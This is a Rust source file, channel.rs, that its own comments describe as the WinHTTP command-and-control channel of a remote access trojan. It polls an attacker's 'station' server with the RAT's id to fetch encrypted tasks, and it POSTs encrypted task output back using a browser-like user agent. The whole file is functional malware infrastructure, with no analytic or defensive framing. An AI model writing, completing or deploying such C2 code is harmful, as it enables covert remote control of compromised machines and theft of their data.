// channel.rs — WinHTTP C2 channel (no reqwest / no tokio)
// GET  /?id=<rat_id>  — poll station for an encrypted task
// POST /              — submit encrypted output

use std::ffi::c_void;
use windows::{
    core::PCWSTR,
    Win32::Networking::WinHttp::{
        WinHttpCloseHandle, WinHttpConnect, WinHttpOpen, WinHttpOpenRequest,
        WinHttpQueryDataAvailable, WinHttpReadData, WinHttpReceiveResponse, WinHttpSendRequest,
        WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_OPEN_REQUEST_FLAGS,
    },
};

fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

/// Split "http://host:port/path" into (host, port, path).
fn parse_url(url: &str) -> Option<(String, u16, String)> {
    let url = url.trim_end_matches('/');
    let rest = url
        .strip_prefix("http://")
        .or_else(|| url.strip_prefix("https://"))?;
    let default_port: u16 = if url.starts_with("https://") { 443 } else { 80 };

    let (authority, path) = match rest.find('/') {
        Some(i) => (&rest[..i], rest[i..].to_string()),
        None    => (rest, "/".to_string()),
    };
    let (host, port) = match authority.rfind(':') {
        Some(i) => (
            authority[..i].to_string(),
            authority[i + 1..].parse().unwrap_or(default_port),
        ),
        None => (authority.to_string(), default_port),
    };
    Some((host, port, path))
}

fn http(method: &str, url: &str, body: Option<&[u8]>, content_type: Option<&str>) -> Option<String> {
    let (host, port, path) = parse_url(url)?;
    let agent_w = to_wide("Mozilla/5.0");

    unsafe {
        // Open session — returns *mut c_void (null on failure)
        let session = WinHttpOpen(
            PCWSTR(agent_w.as_ptr()),
            WINHTTP_ACCESS_TYPE_NO_PROXY,
            PCWSTR::null(),
            PCWSTR::null(),
            0,
        );
        if session.is_null() { return None; }

        let host_w  = to_wide(&host);
        let connect = WinHttpConnect(session, PCWSTR(host_w.as_ptr()), port, 0);
        if connect.is_null() {
            let _ = WinHttpCloseHandle(session);
            return None;
        }

        let verb_w = to_wide(method);
        let path_w = to_wide(&path);
        let hreq   = WinHttpOpenRequest(
            connect,
            PCWSTR(verb_w.as_ptr()),
            PCWSTR(path_w.as_ptr()),
            PCWSTR::null(),
            PCWSTR::null(),
            std::ptr::null(),           // accept all content types
            WINHTTP_OPEN_REQUEST_FLAGS(0),
        );
        if hreq.is_null() {
            let _ = WinHttpCloseHandle(connect);
            let _ = WinHttpCloseHandle(session);
            return None;
        }

        // Headers passed as Option<&[u16]> (slice, no explicit length)
        let headers_w = content_type.map(|ct| to_wide(&format!("Content-Type: {}\r\n", ct)));
        let headers_slice = headers_w.as_deref().map(|h| &h[..h.len() - 1]); // strip null terminator

        let (body_ptr, body_len) = match body {
            Some(b) => (b.as_ptr() as *const c_void, b.len() as u32),
            None    => (std::ptr::null(), 0u32),
        };

        let sent = WinHttpSendRequest(
            hreq,
            headers_slice,
            Some(body_ptr),
            body_len,
            body_len,
            0,
        );

        let result = if sent.is_ok() {
            let recv = WinHttpReceiveResponse(hreq, std::ptr::null_mut());
            if recv.is_ok() {
                let mut data: Vec<u8> = Vec::new();
                loop {
                    let mut avail = 0u32;
                    if WinHttpQueryDataAvailable(hreq, &mut avail).is_err() || avail == 0 {
                        break;
                    }
                    let mut buf = vec![0u8; avail as usize];
                    let mut read = 0u32;
                    if WinHttpReadData(hreq, buf.as_mut_ptr() as *mut c_void, avail, &mut read).is_err() {
                        break;
                    }
                    data.extend_from_slice(&buf[..read as usize]);
                }
                String::from_utf8(data).ok()
            } else {
                None
            }
        } else {
            None
        };

        let _ = WinHttpCloseHandle(hreq);
        let _ = WinHttpCloseHandle(connect);
        let _ = WinHttpCloseHandle(session);

        result
    }
}

/// Poll the station for an encrypted task. Returns the body if non-empty.
pub fn get_task(station: &str, rat_id: &str) -> Option<String> {
    let url  = format!("{}/?id={}", station.trim_end_matches('/'), rat_id);
    let body = http("GET", &url, None, None)?;
    if body.trim().is_empty() { None } else { Some(body) }
}

/// Send encrypted task output back to the station.
pub fn task_io(station: &str, payload: &str) {
    let _ = http("POST", station, Some(payload.as_bytes()), Some("text/plain"));
}

/// Send encrypted payload and return the station's encrypted response.
pub fn task_io_exchange(station: &str, payload: &str) -> Option<String> {
    let resp = http("POST", station, Some(payload.as_bytes()), Some("text/plain"))?;
    if resp.is_empty() { None } else { Some(resp) }
}
